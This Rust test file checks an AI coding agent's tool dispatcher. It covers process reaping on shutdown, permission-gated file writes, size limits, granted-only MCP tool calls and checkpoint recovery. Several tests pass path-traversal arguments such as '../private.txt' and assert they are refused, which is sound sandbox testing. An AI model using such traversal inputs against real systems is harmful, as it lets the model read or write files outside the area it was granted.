use super::*;
use crate::persistent_runtime::{PersistentRuntimeRegistry, RuntimeHost};
use crate::{PermissionMode, SessionEventKind};
use std::collections::BTreeMap;
use std::sync::Mutex as StdMutex;
use std::sync::atomic::{AtomicUsize, Ordering};
use tempfile::tempdir;

#[tokio::test]
#[cfg(unix)]
async fn mcp_disconnect_and_shutdown_reap_the_active_runtime_worker() {
    struct ChildCleanup(i32);
    impl Drop for ChildCleanup {
        fn drop(&mut self) {
            if self.0 > 0 {
                unsafe {
                    libc::kill(self.0, libc::SIGKILL);
                }
            }
        }
    }
    for server_shutdown in [false, true] {
        let directory = tempdir().unwrap();
        let dispatcher = AgentToolDispatcher::new(
            SessionGoalTools::disconnected(),
            SessionTodoTools::disconnected(),
            None,
            crate::LspService::new(directory.path()),
            CodingProvider::Claude,
            Uuid::new_v4(),
            false,
            None,
            None,
            directory.path().to_path_buf(),
            None,
            None,
            None,
            Vec::new(),
            None,
            crate::native_process::ProcessManager::default(),
            PermissionMode::FullAccess,
        );
        let shutdown = CancellationToken::new();
        let (mut client, server) = tokio::io::duplex(8192);
        let task = tokio::spawn(serve_agent_tool_connection(
            server,
            dispatcher.clone(),
            None,
            shutdown.clone(),
        ));
        let request = json!({"name": "runtime_exec", "arguments": {"code":
            "import os, time, subprocess, sys\nfrom pathlib import Path\nsubprocess.Popen([sys.executable, '-c', \"import os, signal, time; from pathlib import Path; signal.signal(signal.SIGTERM, signal.SIG_IGN); Path('child.pid').write_text(str(os.getpid())); time.sleep(60)\"])\nborg.exec(\"/bin/sh -c 'echo $$ > managed.pid; exec sleep 60'\", yield_time_ms=1)\nPath('worker.pid').write_text(str(os.getpid()))\ntime.sleep(60)\nPath('late-write').write_text('must not run')"
        }});
        client
            .write_all(format!("{request}\n").as_bytes())
            .await
            .unwrap();
        let (pid, child_pid, managed_pid): (i32, i32, i32) =
            tokio::time::timeout(Duration::from_secs(5), async {
                loop {
                    if let Ok(pid) =
                        tokio::fs::read_to_string(directory.path().join("worker.pid")).await
                        && let Ok(pid) = pid.parse()
                        && let Ok(child_pid) =
                            tokio::fs::read_to_string(directory.path().join("child.pid")).await
                        && let Ok(child_pid) = child_pid.parse()
                        && let Ok(managed_pid) =
                            tokio::fs::read_to_string(directory.path().join("managed.pid")).await
                        && let Ok(managed_pid) = managed_pid.trim().parse()
                    {
                        break (pid, child_pid, managed_pid);
                    }
                    tokio::time::sleep(Duration::from_millis(10)).await;
                }
            })
            .await
            .expect("runtime must start before cancellation");
        let mut child_cleanup = ChildCleanup(child_pid);
        if server_shutdown {
            shutdown.cancel();
        } else {
            drop(client);
        }
        tokio::time::timeout(Duration::from_secs(3), task)
            .await
            .expect("connection must finish cancellation cleanup")
            .unwrap();
        assert_eq!(
            unsafe { libc::kill(pid, 0) },
            -1,
            "cancelled worker must be reaped"
        );
        tokio::time::timeout(Duration::from_secs(2), async {
            loop {
                let status = tokio::process::Command::new("ps")
                    .args(["-o", "stat=", "-p", &child_pid.to_string()])
                    .output()
                    .await
                    .unwrap();
                let status = String::from_utf8_lossy(&status.stdout);
                // Orphan zombies cannot run and are reaped by the OS, not by Borg.
                if status.trim().is_empty() || status.trim().starts_with('Z') {
                    break;
                }
                tokio::time::sleep(Duration::from_millis(10)).await;
            }
        })
        .await
        .expect("a child ignoring SIGTERM must still be stopped");
        child_cleanup.0 = 0;
        tokio::time::timeout(Duration::from_secs(3), async {
            while unsafe { libc::kill(managed_pid, 0) } == 0 {
                tokio::time::sleep(Duration::from_millis(10)).await;
            }
        })
        .await
        .expect("commands launched through Borg must also be reaped");
        assert!(!directory.path().join("late-write").exists());
        let next = dispatcher
            .call("runtime_exec", json!({"code": "40 + 2"}))
            .await
            .unwrap();
        assert_eq!(next["value"], 42, "next call must get a usable worker");
    }
}

#[tokio::test]
async fn workspace_mutations_preserve_authorization_and_file_contents_on_failure() {
    let directory = tempdir().unwrap();
    let root = directory.path().join("workspace");
    std::fs::create_dir(&root).unwrap();
    let session_id = Uuid::new_v4();
    let dispatcher = AgentToolDispatcher::new(
        SessionGoalTools::disconnected(),
        SessionTodoTools::disconnected(),
        None,
        crate::LspService::new(&root),
        CodingProvider::Codex,
        session_id,
        false,
        None,
        None,
        root.clone(),
        None,
        None,
        None,
        Vec::new(),
        None,
        crate::native_process::ProcessManager::default(),
        PermissionMode::Manual,
    )
    .with_resource_limits(Some(HostResourceLimits {
        max_file_transfer_bytes: 16,
        ..HostResourceLimits::default()
    }));
    let mut host = DispatcherRuntimeHost {
        session_id,
        root: root.clone(),
        allow_effects: false,
        dispatcher: dispatcher.clone(),
        execution_provider: Arc::new(crate::LocalExecutionProvider::new()),
        host_calls: Arc::new(AtomicUsize::new(0)),
        session_store: None,
        runtime_worker_id: Uuid::new_v4(),
        process_cancellation: CancellationToken::new(),
    };
    let create = serde_json::json!({"path": "sample.txt", "content": "same same"});
    assert!(host.call("write_file", create.clone()).await.is_err());
    assert!(!root.join("sample.txt").exists());
    // Sharing the implementation must not expose an unguarded MCP mutation route.
    assert!(dispatcher.call("write_file", create.clone()).await.is_err());
    assert!(
        dispatcher
            .specs()
            .iter()
            .all(|spec| !matches!(spec["name"].as_str(), Some("write_file" | "edit_file")))
    );

    host.allow_effects = true;
    host.call("write_file", create.clone()).await.unwrap();
    assert!(host.call("write_file", create).await.is_err());
    let edit = serde_json::json!({"path": "sample.txt", "old_text": "same", "new_text": "new"});
    assert!(host.call("edit_file", edit.clone()).await.is_err());
    assert_eq!(
        std::fs::read_to_string(root.join("sample.txt")).unwrap(),
        "same same"
    );
    let mut replace_all = edit;
    replace_all["replace_all"] = serde_json::json!(true);
    host.call("edit_file", replace_all).await.unwrap();
    assert_eq!(
        std::fs::read_to_string(root.join("sample.txt")).unwrap(),
        "new new"
    );

    for arguments in [
        serde_json::json!({"path": "sample.txt", "content": "x".repeat(17), "overwrite": true}),
        serde_json::json!({"path": "../outside.txt", "content": "outside"}),
    ] {
        assert!(host.call("write_file", arguments).await.is_err());
    }
    assert!(
        host.call(
            "edit_file",
            serde_json::json!({
                "path": "sample.txt", "old_text": "new new", "new_text": "x".repeat(17),
            })
        )
        .await
        .is_err()
    );
    assert_eq!(
        std::fs::read_to_string(root.join("sample.txt")).unwrap(),
        "new new"
    );
    assert!(!directory.path().join("outside.txt").exists());
    host.allow_effects = false;
    assert!(
        host.call(
            "edit_file",
            serde_json::json!({
                "path": "sample.txt", "old_text": "new new", "new_text": "denied",
            })
        )
        .await
        .is_err()
    );
    assert_eq!(
        std::fs::read_to_string(root.join("sample.txt")).unwrap(),
        "new new"
    );
}

#[tokio::test]
async fn mcp_workspace_reads_are_bounded_and_cannot_escape_the_session_root() {
    let directory = tempdir().unwrap();
    let root = directory.path().join("workspace");
    std::fs::create_dir(&root).unwrap();
    std::fs::write(root.join("sample.txt"), "first\nneedle\nlast\n").unwrap();
    std::fs::write(directory.path().join("private.txt"), "private needle").unwrap();
    let dispatcher = AgentToolDispatcher::new(
        SessionGoalTools::disconnected(),
        SessionTodoTools::disconnected(),
        None,
        crate::LspService::new(&root),
        CodingProvider::Claude,
        Uuid::new_v4(),
        false,
        None,
        None,
        root,
        None,
        None,
        None,
        Vec::new(),
        None,
        crate::native_process::ProcessManager::default(),
        PermissionMode::Manual,
    );
    let (client, server) = tokio::io::duplex(8192);
    let task = tokio::spawn(serve_agent_tool_connection(
        server,
        dispatcher,
        None,
        CancellationToken::new(),
    ));
    let (read, mut write) = tokio::io::split(client);
    let mut lines = BufReader::new(read).lines();
    for (name, arguments, denied) in [
        ("__borg_tools", json!({}), false),
        (
            "read_file",
            json!({"action":"read", "path":"sample.txt", "offset_line":2, "limit_lines":1}),
            false,
        ),
        (
            "search_files",
            json!({"action":"search", "pattern":"needle", "path":"."}),
            false,
        ),
        ("list_files", json!({"action":"list", "path":"."}), false),
        (
            "read_file",
            json!({"action":"read", "path":"../private.txt"}),
            true,
        ),
        (
            "search_files",
            json!({"action":"search", "pattern":"needle", "path":".."}),
            true,
        ),
        ("list_files", json!({"action":"list", "path":".."}), true),
    ] {
        let request = json!({"name":name, "arguments":arguments}).to_string() + "\n";
        write.write_all(request.as_bytes()).await.unwrap();
        let line = tokio::time::timeout(Duration::from_secs(5), lines.next_line())
            .await
            .unwrap()
            .unwrap()
            .unwrap();
        let response: Value = serde_json::from_str(&line).unwrap();
        assert_eq!(
            response.get("error").is_some(),
            denied,
            "{name}: {response}"
        );
        if denied {
            continue;
        }
        let result = &response["result"];
        match name {
            "__borg_tools" => {
                for name in ["read_file", "search_files", "list_files"] {
                    assert!(
                        result
                            .as_array()
                            .unwrap()
                            .iter()
                            .any(|spec| spec["name"] == name)
                    );
                }
            }
            "read_file" => {
                assert_eq!(result["text"], "needle\n");
                assert_eq!(result["next_line"], 3);
            }
            "search_files" => {
                assert_eq!(result["matches"].as_array().unwrap().len(), 1);
                assert_eq!(result["matches"][0]["line"], 2);
            }
            "list_files" => assert_eq!(result["entries"][0]["name"], "sample.txt"),
            _ => unreachable!(),
        }
    }
    drop(write);
    drop(lines);
    task.await.unwrap();
}

#[test]
fn agent_mcp_executable_uses_existing_current_binary() {
    let directory = tempdir().unwrap();
    let executable = directory.path().join("borg");
    std::fs::write(&executable, b"borg").unwrap();

    assert_eq!(
        resolve_agent_mcp_executable(&executable).unwrap(),
        executable
    );
}

#[cfg(target_os = "linux")]
#[test]
fn agent_mcp_executable_recovers_path_after_atomic_upgrade() {
    let directory = tempdir().unwrap();
    let executable = directory.path().join("borg");
    std::fs::write(&executable, b"replacement").unwrap();
    let deleted_identity = PathBuf::from(format!("{} (deleted)", executable.display()));

    assert_eq!(
        resolve_agent_mcp_executable(&deleted_identity).unwrap(),
        executable
    );
}

#[derive(Clone, Default)]
struct RecordingPeerExecutor {
    prompts: Arc<StdMutex<Vec<String>>>,
}

#[async_trait::async_trait]
impl crate::AgentTurnExecutor for RecordingPeerExecutor {
    async fn execute(
        &self,
        turn: crate::AgentTurn,
        events: mpsc::Sender<SessionEventKind>,
        _controls: Option<mpsc::Receiver<crate::AgentTurnControl>>,
    ) -> Result<crate::AgentTurnResult> {
        let response = {
            let mut prompts = self.prompts.lock().expect("peer prompt lock");
            let response = format!("persistent peer reply {}", prompts.len() + 1);
            prompts.push(turn.prompt);
            response
        };
        events
            .send(SessionEventKind::Message {
                message_id: Uuid::new_v4(),
                actor: EventActor::Assistant,
                text: "I am checking the supplied evidence before deciding.".to_string(),
                attachments: Vec::new(),
                status: MessageStatus::Complete,
                delivery: None,
            })
            .await
            .map_err(|_| anyhow::anyhow!("peer event receiver closed"))?;
        Ok(crate::AgentTurnResult {
            provider_session_id: Some("persistent-peer-session".to_string()),
            final_text: response,
        })
    }
}

#[derive(Clone)]
struct ControlledPeerExecutor {
    calls: Arc<AtomicUsize>,
    first_started: Arc<tokio::sync::Notify>,
    release_first: Arc<tokio::sync::Notify>,
}

#[async_trait::async_trait]
impl crate::AgentTurnExecutor for ControlledPeerExecutor {
    async fn execute(
        &self,
        turn: crate::AgentTurn,
        events: mpsc::Sender<SessionEventKind>,
        _controls: Option<mpsc::Receiver<crate::AgentTurnControl>>,
    ) -> Result<crate::AgentTurnResult> {
        let call = self.calls.fetch_add(1, Ordering::SeqCst) + 1;
        events
            .send(SessionEventKind::Message {
                message_id: Uuid::new_v4(),
                actor: EventActor::Assistant,
                text: format!("peer progress {call}: {}", turn.prompt.len()),
                attachments: Vec::new(),
                status: MessageStatus::Complete,
                delivery: None,
            })
            .await
            .map_err(|_| anyhow::anyhow!("peer event receiver closed"))?;
        if call == 1 {
            self.first_started.notify_waiters();
            self.release_first.notified().await;
        }
        Ok(crate::AgentTurnResult {
            provider_session_id: Some("controlled-peer-session".to_string()),
            final_text: format!("peer final {call}"),
        })
    }
}

#[derive(Clone, Default)]
struct EmptyPeerExecutor;

#[async_trait::async_trait]
impl crate::AgentTurnExecutor for EmptyPeerExecutor {
    async fn execute(
        &self,
        _turn: crate::AgentTurn,
        _events: mpsc::Sender<SessionEventKind>,
        _controls: Option<mpsc::Receiver<crate::AgentTurnControl>>,
    ) -> Result<crate::AgentTurnResult> {
        Ok(crate::AgentTurnResult {
            provider_session_id: Some("empty-peer-session".to_string()),
            final_text: String::new(),
        })
    }
}

fn test_provider_capabilities() -> Vec<crate::ProviderCapability> {
    [
        CodingProvider::Codex,
        CodingProvider::Claude,
        CodingProvider::OpenRouter,
        CodingProvider::OpenAiCompatible,
    ]
    .into_iter()
    .map(|provider| crate::ProviderCapability {
        provider,
        installed: true,
        version: Some("test".to_string()),
        authenticated: true,
        auth_detail: Some("test credentials".to_string()),
        auth_methods: vec![crate::ProviderAuthMethod::Subscription],
        can_spawn: true,
        usage: None,
        billing: None,
    })
    .collect()
}

fn launch() -> LaunchSession {
    LaunchSession {
        request_id: Uuid::new_v4(),
        cwd: PathBuf::from("/workspace"),
        provider: CodingProvider::Codex,
        model: Some("gpt-test".into()),
        effort: Some("high".into()),
        fast: Some(false),
        response_language: crate::ResponseLanguage::Auto,
        permission_mode: PermissionMode::Manual,
        name: None,
        initial_prompt: None,
        capabilities: crate::SessionCapabilities {
            provider_capabilities: test_provider_capabilities(),
            ..crate::SessionCapabilities::default()
        },
        subagent_concurrency_limit: None,
        extension_skill_roots: Vec::new(),
        team_policy: None,
    }
}

#[tokio::test]
async fn persistent_runtime_supports_a_surf_calibration_notebook() {
    let command = std::env::var("BORG_PYTHON_RUNTIME").unwrap_or_else(|_| {
        if cfg!(windows) {
            "python".to_string()
        } else {
            "python3".to_string()
        }
    });
    if !tokio::process::Command::new(command)
        .arg("--version")
        .output()
        .await
        .is_ok_and(|output| output.status.success())
    {
        return;
    }
    let directory = tempdir().unwrap();
    std::fs::write(
        directory.path().join("reference.jsonl"),
        "{\"tick\":0,\"position\":[0.0,0.0],\"speed\":100.0}\n{\"tick\":1,\"position\":[1.0,0.0],\"speed\":101.0}\n",
    )
    .unwrap();
    let session_id = Uuid::new_v4();
    let dispatcher = AgentToolDispatcher::new(
        SessionGoalTools::disconnected(),
        SessionTodoTools::disconnected(),
        None,
        crate::LspService::new(directory.path()),
        CodingProvider::Codex,
        session_id,
        false,
        None,
        None,
        directory.path().to_path_buf(),
        None,
        None,
        None,
        Vec::new(),
        None,
        crate::native_process::ProcessManager::default(),
        PermissionMode::FullAccess,
    );

    dispatcher
        .call(
            "runtime_exec",
            serde_json::json!({
                "code": "import json\nreference = [json.loads(line) for line in borg.read('reference.jsonl')['text'].splitlines()]\ndef compare(candidate):\n    errors = [((row['position'][0] - ref['position'][0]) ** 2 + (row['position'][1] - ref['position'][1]) ** 2) ** 0.5 for row, ref in zip(candidate, reference)]\n    return {'ticks': len(errors), 'position_rmse': (sum(error * error for error in errors) / len(errors)) ** 0.5, 'position_max': max(errors), 'first_divergence': next((index for index, error in enumerate(errors) if error > 0.001), None)}"
            }),
        )
        .await
        .unwrap();
    let metrics = dispatcher
        .call(
            "runtime_exec",
            serde_json::json!({
                "code": "candidate = [{'position': [0.0, 0.0]}, {'position': [1.25, 0.0]}]\ncompare(candidate)"
            }),
        )
        .await
        .unwrap();

    assert_eq!(metrics["persistent"], true);
    assert_eq!(metrics["value"]["ticks"], 2);
    assert_eq!(metrics["value"]["first_divergence"], 1);
    assert!(metrics["value"]["position_max"].as_f64().unwrap() > 0.24);
}

#[tokio::test]
async fn dispatcher_can_select_the_optional_bun_javascript_runtime() {
    let command = std::env::var("BORG_BUN_RUNTIME").unwrap_or_else(|_| "bun".to_string());
    if !tokio::process::Command::new(command)
        .arg("--version")
        .output()
        .await
        .is_ok_and(|output| output.status.success())
    {
        return;
    }
    let directory = tempdir().unwrap();
    let session_id = Uuid::new_v4();
    let dispatcher = AgentToolDispatcher::new(
        SessionGoalTools::disconnected(),
        SessionTodoTools::disconnected(),
        None,
        crate::LspService::new(directory.path()),
        CodingProvider::Codex,
        session_id,
        false,
        None,
        None,
        directory.path().to_path_buf(),
        None,
        None,
        None,
        Vec::new(),
        None,
        crate::native_process::ProcessManager::default(),
        PermissionMode::FullAccess,
    );
    let result = dispatcher
        .call(
            "runtime_exec",
            json!({
                "runtime": "javascript",
                "code": "answer = 40\nanswer = answer + 2\nanswer"
            }),
        )
        .await
        .unwrap();
    assert_eq!(result["runtime"], "javascript");
    assert_eq!(result["value"], 42);
}

#[tokio::test]
async fn dispatcher_and_python_share_the_canonical_lossless_history_query() {
    let command = std::env::var("BORG_PYTHON_RUNTIME").unwrap_or_else(|_| {
        if cfg!(windows) {
            "python".to_string()
        } else {
            "python3".to_string()
        }
    });
    if !tokio::process::Command::new(command)
        .arg("--version")
        .output()
        .await
        .is_ok_and(|output| output.status.success())
    {
        return;
    }
    let directory = tempdir().unwrap();
    let (scratch, store) = crate::session_store::postgres::testing::session_store().await;
    let session_id = Uuid::new_v4();
    store.create_session(session_id).await.unwrap();
    store
        .append(SessionEvent::new(
            session_id,
            0,
            SessionEventKind::Message {
                message_id: Uuid::new_v4(),
                actor: EventActor::User,
                text: "durable alpha evidence".to_string(),
                attachments: Vec::new(),
                status: MessageStatus::Complete,
                delivery: None,
            },
        ))
        .await
        .unwrap();
    let autonomy: Option<std::sync::Arc<dyn crate::autonomy::AutonomyStore>> =
        store.autonomy_store().await.unwrap();
    let dispatcher = AgentToolDispatcher::new(
        SessionGoalTools::disconnected(),
        SessionTodoTools::disconnected(),
        None,
        crate::LspService::new(directory.path()),
        CodingProvider::Codex,
        session_id,
        false,
        None,
        None,
        directory.path().to_path_buf(),
        None,
        autonomy,
        Some(std::sync::Arc::new(store.clone()) as std::sync::Arc<dyn crate::SessionStore>),
        Vec::new(),
        None,
        crate::native_process::ProcessManager::default(),
        PermissionMode::FullAccess,
    );

    let direct = dispatcher
        .call("query_history", json!({ "text": "alpha evidence" }))
        .await
        .unwrap();
    assert_eq!(direct["backend"], "postgres_tsvector");
    assert_eq!(direct["hits"].as_array().unwrap().len(), 1);

    let direct_index = dispatcher
        .call("history_index", json!({ "after_sequence": 0, "limit": 10 }))
        .await
        .unwrap();
    assert_eq!(direct_index["documents"].as_array().unwrap().len(), 1);
    assert_eq!(direct_index["next_after_sequence"], 1);
    assert_eq!(direct_index["page_truncated"], false);
    assert!(direct_index["page_bytes"].as_u64().unwrap() > 0);

    let through_python = dispatcher
        .call(
            "runtime_exec",
            json!({ "code": "borg.history('alpha evidence')['hits'][0]['event']['sequence']" }),
        )
        .await
        .unwrap();
    assert_eq!(through_python["value"], 1);

    let through_history_index = dispatcher
        .call(
            "runtime_exec",
            json!({
                "code": "page = borg.history_index(0, 10)\npage['documents'][0]['content']"
            }),
        )
        .await
        .unwrap();
    assert!(
        through_history_index["value"]
            .as_str()
            .is_some_and(|content| content.contains("alpha evidence"))
    );
    scratch.discard().await;
}

#[tokio::test]
async fn history_index_reports_oversized_documents_without_exceeding_runtime_budget() {
    let (scratch, store) = crate::session_store::postgres::testing::session_store().await;
    let session_id = Uuid::new_v4();
    store.create_session(session_id).await.unwrap();
    let event = SessionEvent::new(
        session_id,
        0,
        SessionEventKind::Message {
            message_id: Uuid::new_v4(),
            actor: EventActor::User,
            text: "x".repeat(800_000),
            attachments: Vec::new(),
            status: MessageStatus::Complete,
            delivery: None,
        },
    );
    let event_id = event.id;
    store.append(event).await.unwrap();

    let page = history_index_response(
        &store,
        session_id,
        HistoryIndexArgs {
            after_sequence: Some(0),
            limit: Some(10),
        },
    )
    .await
    .unwrap();

    assert!(page["documents"].as_array().unwrap().is_empty());
    assert_eq!(page["next_after_sequence"], 0);
    assert_eq!(page["has_more"], true);
    assert_eq!(page["page_truncated"], true);
    assert!(page["page_bytes"].as_u64().unwrap() < 768 * 1024);
    assert_eq!(page["oversized_document"]["event_id"], event_id.to_string());
    assert!(
        page["oversized_document"]["content_bytes"]
            .as_u64()
            .is_some_and(|bytes| bytes > 768 * 1024)
    );
    scratch.discard().await;
}

#[tokio::test]
async fn persistent_runtime_can_call_only_the_granted_external_mcp_tools() {
    let command = std::env::var("BORG_PYTHON_RUNTIME").unwrap_or_else(|_| {
        if cfg!(windows) {
            "python".to_string()
        } else {
            "python3".to_string()
        }
    });
    if !tokio::process::Command::new(&command)
        .arg("--version")
        .output()
        .await
        .is_ok_and(|output| output.status.success())
    {
        return;
    }
    let directory = tempdir().unwrap();
    let dispatcher = AgentToolDispatcher::new(
        SessionGoalTools::disconnected(),
        SessionTodoTools::disconnected(),
        None,
        crate::LspService::new(directory.path()),
        CodingProvider::Codex,
        Uuid::new_v4(),
        false,
        None,
        None,
        directory.path().to_path_buf(),
        None,
        None,
        None,
        Vec::new(),
        None,
        crate::native_process::ProcessManager::default(),
        PermissionMode::FullAccess,
    );
    let script = r#"
read _initialize
printf '%s\n' '{"jsonrpc":"2.0","id":1,"result":{"protocolVersion":"2024-11-05","capabilities":{},"serverInfo":{"name":"fake","version":"1"}}}'
read _initialized
read _list
printf '%s\n' '{"jsonrpc":"2.0","id":2,"result":{"tools":[{"name":"lookup","description":"Lookup","inputSchema":{"type":"object"}}]}}'
read _call
printf '%s\n' '{"jsonrpc":"2.0","id":3,"result":{"content":[{"type":"text","text":"retrieved"}]}}'
read _call
printf '%s\n' '{"jsonrpc":"2.0","id":4,"result":{"content":[{"type":"text","text":"retrieved"}]}}'
"#;
    dispatcher
        .configure_runtime_mcp(vec![borg_provider::mcp::ExternalMcpServer {
            name: "retrieval".to_string(),
            command: "sh".to_string(),
            args: vec!["-c".to_string(), script.to_string()],
            env: BTreeMap::new(),
            allowed_tools: vec!["lookup".to_string()],
        }])
        .await
        .unwrap();

    let result = dispatcher
        .call(
            "runtime_exec",
            json!({
                "code": "tools = borg.mcp_tools()\nresponse = borg.mcp('mcp__retrieval__lookup', {'query': 'alpha'})\n{'tool': tools[0]['name'], 'text': response['content'][0]['text']}"
            }),
        )
        .await
        .unwrap();
    assert_eq!(
        result["value"],
        json!({"tool": "mcp__retrieval__lookup", "text": "retrieved"})
    );

    dispatcher
        .call(
            "create_retrieval_adapter",
            json!({
                "id": "mcp-ranker",
                "description": "Use the granted product search boundary",
                "source": "def retrieve(query):\n    response = borg.mcp('mcp__retrieval__lookup', {'query': query})\n    return {'query': query, 'text': response['content'][0]['text']}\n"
            }),
        )
        .await
        .unwrap();
    let adapter_result = dispatcher
        .call(
            "runtime_exec",
            json!({
                "code": "borg.retrieval_adapter('mcp-ranker', 'beta')"
            }),
        )
        .await
        .unwrap();
    assert_eq!(
        adapter_result["value"],
        json!({"query": "beta", "text": "retrieved"})
    );
}

#[tokio::test]
async fn extension_mcp_grant_is_available_through_the_persistent_environment_binding() {
    let command = std::env::var("BORG_PYTHON_RUNTIME").unwrap_or_else(|_| {
        if cfg!(windows) {
            "python".to_string()
        } else {
            "python3".to_string()
        }
    });
    if !tokio::process::Command::new(&command)
        .arg("--version")
        .output()
        .await
        .is_ok_and(|output| output.status.success())
    {
        return;
    }
    let directory = tempdir().unwrap();
    let dispatcher = AgentToolDispatcher::new(
        SessionGoalTools::disconnected(),
        SessionTodoTools::disconnected(),
        None,
        crate::LspService::new(directory.path()),
        CodingProvider::Codex,
        Uuid::new_v4(),
        false,
        None,
        None,
        directory.path().to_path_buf(),
        None,
        None,
        None,
        Vec::new(),
        None,
        crate::native_process::ProcessManager::default(),
        PermissionMode::FullAccess,
    );
    dispatcher.configure_runtime_mcp(Vec::new()).await.unwrap();
    let script = r#"
read _initialize
printf '%s\n' '{"jsonrpc":"2.0","id":1,"result":{"protocolVersion":"2024-11-05","capabilities":{},"serverInfo":{"name":"surf","version":"1"}}}'
read _initialized
read _list
printf '%s\n' '{"jsonrpc":"2.0","id":2,"result":{"tools":[{"name":"map.generate","description":"Generate a map","inputSchema":{"type":"object"}}]}}'
read _call
printf '%s\n' '{"jsonrpc":"2.0","id":3,"result":{"content":[{"type":"text","text":"tick advanced"}]}}'
"#;
    dispatcher
        .configure_runtime_mcp_extensions(vec![borg_provider::mcp::ExternalMcpServer {
            name: "surf-lab__lab".to_string(),
            command: "sh".to_string(),
            args: vec!["-c".to_string(), script.to_string()],
            env: BTreeMap::new(),
            allowed_tools: vec!["map.generate".to_string()],
        }])
        .await
        .unwrap();

    let result = dispatcher
        .call(
            "runtime_exec",
            json!({
                "code": "env = borg.environment('surf-lab', 'lab')\ntools = env.tools()\nresponse = env.call('map.generate', {'seed': 7})\n{'tool': tools[0]['name'], 'text': response['content'][0]['text']}"
            }),
        )
        .await
        .unwrap();
    assert_eq!(
        result["value"],
        json!({"tool": "mcp__surf_lab__lab__map_generate", "text": "tick advanced"})
    );
}

#[tokio::test]
async fn read_only_runtime_allows_scoped_semantic_search_only() {
    let command = std::env::var("BORG_PYTHON_RUNTIME").unwrap_or_else(|_| {
        if cfg!(windows) {
            "python".to_string()
        } else {
            "python3".to_string()
        }
    });
    if !tokio::process::Command::new(&command)
        .arg("--version")
        .output()
        .await
        .is_ok_and(|output| output.status.success())
    {
        return;
    }
    let directory = tempdir().unwrap();
    let dispatcher = AgentToolDispatcher::new(
        SessionGoalTools::disconnected(),
        SessionTodoTools::disconnected(),
        None,
        crate::LspService::new(directory.path()),
        CodingProvider::Codex,
        Uuid::new_v4(),
        false,
        None,
        None,
        directory.path().to_path_buf(),
        None,
        None,
        None,
        Vec::new(),
        None,
        crate::native_process::ProcessManager::default(),
        PermissionMode::Manual,
    );
    let script = r#"
read _initialize
printf '%s\n' '{"jsonrpc":"2.0","id":1,"result":{"protocolVersion":"2024-11-05","capabilities":{},"serverInfo":{"name":"fake","version":"1"}}}'
read _initialized
read _list
printf '%s\n' '{"jsonrpc":"2.0","id":2,"result":{"tools":[{"name":"search_documents","description":"Search","inputSchema":{"type":"object"}}]}}'
read _call
printf '%s\n' '{"jsonrpc":"2.0","id":3,"result":{"content":[{"type":"text","text":"semantic hit"}]}}'
"#;
    dispatcher
        .configure_runtime_mcp(vec![borg_provider::mcp::ExternalMcpServer {
            name: "borg".to_string(),
            command: "sh".to_string(),
            args: vec!["-c".to_string(), script.to_string()],
            env: BTreeMap::new(),
            allowed_tools: vec!["search_documents".to_string()],
        }])
        .await
        .unwrap();

    let runtime = PersistentRuntimeRegistry::default()
        .python_for_session(Uuid::new_v4(), directory.path(), None)
        .await;
    let host: Arc<dyn RuntimeHost> = Arc::new(DispatcherRuntimeHost {
        session_id: Uuid::new_v4(),
        root: directory.path().to_path_buf(),
        allow_effects: false,
        dispatcher: dispatcher.clone(),
        execution_provider: Arc::new(crate::LocalExecutionProvider::new()),
        host_calls: Arc::new(AtomicUsize::new(0)),
        session_store: None,
        runtime_worker_id: runtime.worker_id(),
        process_cancellation: CancellationToken::new(),
    });
    let result = runtime
        .execute("borg.semantic_search('alpha')", None, Arc::clone(&host))
        .await
        .unwrap();
    assert_eq!(result.value["content"][0]["text"], "semantic hit");

    let denied = runtime
        .execute("borg.mcp('mcp__borg__read_document', {})", None, host)
        .await
        .expect_err("unapproved MCP calls must remain permission-gated");
    assert!(
        denied
            .to_string()
            .contains("persistent runtime host mutation")
    );
}

#[tokio::test]
async fn persistent_runtime_rehydrates_explicit_checkpoint_after_worker_restart() {
    let command = std::env::var("BORG_PYTHON_RUNTIME").unwrap_or_else(|_| {
        if cfg!(windows) {
            "python".to_string()
        } else {
            "python3".to_string()
        }
    });
    if !tokio::process::Command::new(command)
        .arg("--version")
        .output()
        .await
        .is_ok_and(|output| output.status.success())
    {
        return;
    }
    let directory = tempdir().unwrap();
    let (scratch, store) = crate::session_store::postgres::testing::session_store().await;
    let session_id = Uuid::new_v4();
    store.create_session(session_id).await.unwrap();
    let first_autonomy: Option<std::sync::Arc<dyn crate::autonomy::AutonomyStore>> =
        store.autonomy_store().await.unwrap();
    let first = AgentToolDispatcher::new(
        SessionGoalTools::disconnected(),
        SessionTodoTools::disconnected(),
        None,
        crate::LspService::new(directory.path()),
        CodingProvider::Codex,
        session_id,
        false,
        None,
        None,
        directory.path().to_path_buf(),
        None,
        first_autonomy,
        Some(std::sync::Arc::new(store.clone()) as std::sync::Arc<dyn crate::SessionStore>),
        Vec::new(),
        None,
        crate::native_process::ProcessManager::default(),
        PermissionMode::FullAccess,
    );
    let first_result = first
        .call(
            "runtime_exec",
            json!({
                "code": "borg.checkpoint('v1', {'answer': 42, 'cursor': 7})"
            }),
        )
        .await
        .unwrap();
    assert_eq!(first_result["recovered_from_manifest"], false);
    assert_eq!(first_result["execution_count"], 1);
    drop(first);

    let second_autonomy: Option<std::sync::Arc<dyn crate::autonomy::AutonomyStore>> =
        store.autonomy_store().await.unwrap();
    let second = AgentToolDispatcher::new(
        SessionGoalTools::disconnected(),
        SessionTodoTools::disconnected(),
        None,
        crate::LspService::new(directory.path()),
        CodingProvider::Codex,
        session_id,
        false,
        None,
        None,
        directory.path().to_path_buf(),
        None,
        second_autonomy,
        Some(std::sync::Arc::new(store.clone()) as std::sync::Arc<dyn crate::SessionStore>),
        Vec::new(),
        None,
        crate::native_process::ProcessManager::default(),
        PermissionMode::FullAccess,
    );
    let status = second
        .call("runtime_exec", json!({ "code": "borg.runtime_status()" }))
        .await
        .unwrap();
    assert_eq!(status["recovered_from_manifest"], true);
    assert_eq!(status["value"]["manifest"]["status"], "running");
    assert_eq!(status["value"]["checkpoints"][0]["key"], "v1");

    let automatically_rehydrated = second
        .call("runtime_exec", json!({ "code": "answer + cursor" }))
        .await
        .unwrap();
    assert_eq!(automatically_rehydrated["value"], 49);

    let restored = second
        .call(
            "runtime_exec",
            json!({ "code": "borg.restore('v1')['state']['answer']" }),
        )
        .await
        .unwrap();
    assert_eq!(restored["value"], 42);
    scratch.discard().await;
}

#[derive(Clone)]
struct CanonicalDogfoodExecutor {
    phase: Arc<AtomicUsize>,
}

impl CanonicalDogfoodExecutor {
    fn new() -> Self {
        Self {
            phase: Arc::new(AtomicUsize::new(0)),
        }
    }
}
